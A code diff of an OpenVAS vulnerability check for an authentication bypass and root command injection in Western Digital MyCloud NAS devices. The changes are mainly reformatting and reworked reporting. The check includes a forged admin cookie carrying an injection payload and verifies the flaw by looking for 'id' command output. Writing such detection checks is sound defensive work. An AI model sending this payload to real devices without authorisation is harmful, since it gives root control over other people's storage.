@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wd_mycloud_rce2.nasl 5998 2017-04-21 08:54:45Z cfi $
+# $Id: gb_wd_mycloud_rce2.nasl 7942 2017-11-30 11:48:20Z cfischer $
 #
 # WD MyCloud Products Authentication Bypass and Multiple Remote Command Injection Vulnerabilities
 #
@@ -29,8 +29,8 @@ CPE = 'cpe:/a:western_digital:mycloud_nas';
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.108149");
-  script_version("$Revision: 5998 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-04-21 10:54:45 +0200 (Fri, 21 Apr 2017) $");
+  script_version("$Revision: 7942 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-11-30 12:48:20 +0100 (Thu, 30 Nov 2017) $");
   script_tag(name:"creation_date", value:"2017-04-21 08:00:00 +0200 (Fri, 21 Apr 2017)");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
@@ -45,15 +45,16 @@ if(description)
   script_xref(name:"URL", value:"http://support.wdc.com/downloads.aspx?lang=en#firmware");
   script_xref(name:"URL", value:"https://www.exploitee.rs/index.php/Western_Digital_MyCloud");
 
-  script_tag(name:"summary", value:"Western Digital MyCloud Products are prone to an authentication bypass and multiple remote command injection vulnerabilities.");
+  script_tag(name:"summary", value:"Western Digital MyCloud Products are prone to an authentication
+  bypass and multiple remote command injection vulnerabilities.");
 
   script_tag(name:"vuldetect", value:"Send a crafted HTTP POST request and check the response.");
 
-  script_tag(name:"impact", value:"Successful exploit allows an attacker to execute arbitrary commands with root privileges
-  in context of the affected application.");
+  script_tag(name:"impact", value:"Successful exploit allows an attacker to execute arbitrary commands
+  with root privileges in context of the affected application.");
 
-  script_tag(name:"solution", value:"The vendor has released firmware updates. Please see the reference for more details
-  and downloads.");
+  script_tag(name:"solution", value:"The vendor has released firmware updates. Please see the reference
+  for more details and downloads.");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_app");
@@ -64,9 +65,10 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
+include("misc_func.inc");
 
-if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
-if( ! dir = get_app_location( cpe:CPE, port:port, service:"www" ) ) exit( 0 );
+if( ! port = get_app_port( cpe:CPE, service:"www" ) ) exit( 0 );
+if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
 
 if( dir == "/" ) dir = "";
 
@@ -77,19 +79,22 @@ cookie = 'isAdmin=1;username=admin" -s 1337 -c "';
 req = http_post_req( port:port, url:url, data:data,
                      accept_header:"application/xml, text/xml, */*; q=0.01",
                      add_headers:make_array( "Content-Type", "application/x-www-form-urlencoded", "Cookie", cookie ) );
-res = http_keepalive_send_recv( port:port, data:req );
+res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
 
-if( res =~ "HTTP/1\.[0-1] 200" && res =~ "uid=[0-9]+.*gid=[0-9]+" ) {
+if( res =~ "HTTP/1\.[01] 200" && res =~ "uid=[0-9]+.*gid=[0-9]+" ) {
 
   uid = eregmatch( pattern:"(uid=[0-9]+.*gid=[0-9]+[^ ]+)", string:res );
 
-  report = 'By requesting the URL "' + report_vuln_url( port:port, url:url, url_only:TRUE ) + '" with the following data set:\n\n' + 
-           '"HTTP POST" body: ' + data + '\n' +
-           'Cookie: ' + cookie + '\n\n' +
-           'it was possible to execute the "id" command.\n\nResult: ' + uid[1] + '\n';
+  info['"HTTP POST" body'] = data;
+  info['Cookie'] = cookie;
+  info['URL'] = report_vuln_url( port:port, url:url, url_only:TRUE );
+
+  report  = 'By doing the following request:\n\n';
+  report += text_format_table( array:info ) + '\n';
+  report += 'it was possible to execute the "id" command.';
+  report += '\n\nResult: ' + uid[1];
 
   expert_info = 'Request:\n'+ req + 'Response:\n' + res + '\n';
-
   security_message( port:port, data:report, expert_info:expert_info );
   exit( 0 );
 }
